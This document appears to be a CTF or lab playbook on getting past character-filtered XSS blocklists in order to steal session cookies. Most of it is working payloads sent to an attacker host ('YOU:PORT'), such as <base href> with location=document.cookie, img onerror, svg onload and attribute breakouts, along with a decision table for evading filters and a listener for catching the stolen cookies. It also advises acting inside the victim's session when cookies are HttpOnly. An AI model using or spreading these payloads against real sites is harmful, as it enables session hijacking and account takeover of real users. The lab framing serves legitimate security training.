# Filtered XSS — exfiltrating when characters are blocked

Real targets strip characters. The real skill is building a working cookie-steal when
`()`, `+`, backticks, `?`, `{}`, `[]`, `;`, quotes or spaces are gone. Standard payloads
(`<script>fetch(...)</script>`, `alert(1)`, `new Image().src='..'+document.cookie`) ALL die
under a typical blocklist. **Step 0: run `scripts/xss-filter-probe.sh` to see what survives.**
Then pick from below by what's blocked.

---

## The move that beats the nastiest filter: `<base>` + relative URL
Blocked `( ) + \` $ { } [ ]` (no function calls, no string concatenation)? You can still
*assign* and *navigate*. Inject a `<base>` so a **relative** URL resolves to YOUR server,
then set `location` to the cookie — the cookie becomes the URL path. Zero of the blocked chars:
```html
<base href="http://YOU:PORT/"><script>location=document.cookie</script>
```
- `<base href>` retargets every relative URL to your host — no concatenation needed.
- `location=document.cookie` — assignment (no `()`), cookie is a relative path.
- cookie lands as the PATH: your server logs `GET /PHPSESSID=abc...` — no `?` needed.
- Only uses `< > = " : / .` and letters. (This is the jubula solution.)
Catch it with a plain listener: `python3 -m http.server PORT` (or `scripts/catch-server.py`).

### Why the obvious ones fail here
| Payload | Needs | Dies when blocked |
|---|---|---|
| `fetch('http://you/?c='+document.cookie)` | `()` `+` `?` | any of them |
| `new Image().src='http://you/?'+document.cookie` | `()` `+` `?` | any of them |
| `` `${document.cookie}` `` (template literal) | `` ` `` `${}` | backtick/`$`/`{}` |
| `location='http://you/#'+document.cookie` | `+` | `+` |

---

## Decision table — "X is blocked → do Y"
- **No `( )` (no function calls):** you can't call `fetch`/`alert`/`encodeURIComponent`.
  Use **assignment to a setter**: `location=…`, `img.src=…`, `el.innerHTML=…`, and **event handlers**
  (`onerror`, `onload`) which run code without you calling anything.
- **No `+` / backtick / `${}` (no string concat):** don't build `base+cookie` at all.
  Use **`<base>` + relative** (above), or set `location.pathname=document.cookie` if the host is already yours,
  or stash data in a property the browser sends on its own.
- **No `?` (no query string):** put data in the **path** (`/PHPSESSID=…`) — `=` in a path is fine; your
  `http.server` logs it regardless of the 404.
- **No `<` `>` (can't open a new tag):** you're inside an existing attribute/tag — **break out via the
  attribute/event handler**, e.g. `" onmouseover=location=document.cookie x="` or `' autofocus onfocus=…`.
- **No quotes `"` `'`:** use **unquoted HTML attributes** (`<img src=x onerror=location=document.cookie>`),
  and build strings from code you don't need to quote (e.g. `location=document.cookie` needs no literals).
- **No space:** use `/` as an attribute separator (`<img/src=x/onerror=…>`) or `%09`/`%0c`/`<` tricks.
- **`<script>` stripped or won't run:** use an **event-handler** tag that always fires:
  `<img src=x onerror=location=document.cookie>` · `<svg onload=location=document.cookie>` ·
  `<input autofocus onfocus=location=document.cookie>` · `<body onload=…>`.
- **HttpOnly cookie (can't read `document.cookie`):** stop trying to steal it — **act in the session**
  instead (fetch an admin endpoint, submit with a scraped CSRF token) — see xss-exploitation.md.

## No-paren exfil variants (pick what the filter allows)
```html
<img src=x onerror=location=document.cookie>                 <!-- needs a <base> for your host -->
<svg onload=location=document.cookie>
<base href="//YOU:PORT/"><img src=x onerror=location=document.cookie>
<base href="//YOU:PORT/"><script>location=document.cookie</script>
<base href="//YOU:PORT/"><script>location=document.URL</script>  <!-- exfil current URL/params instead -->
```
Note `//YOU:PORT/` (protocol-relative) also dodges needing `http:` if `:` is awkward in context
(here `:` was allowed, so `http://` is fine).

## Ordering gotcha (stored XSS with multiple entries)
The **first** `<base href>` and the **first** navigation in the page win — if an earlier stored
comment already set a `<base>` or did `location=`, your later payload never runs or resolves to the
wrong host. On a shared lab, clear/revert stored entries before relying on your own payload landing.

## Confirm first, then steal
Before the cookie payload, prove execution survives the filter with a no-char beacon:
`<img src=x onerror=location=document.URL>` — if your server logs a hit, JS runs; then swap to
`document.cookie`.
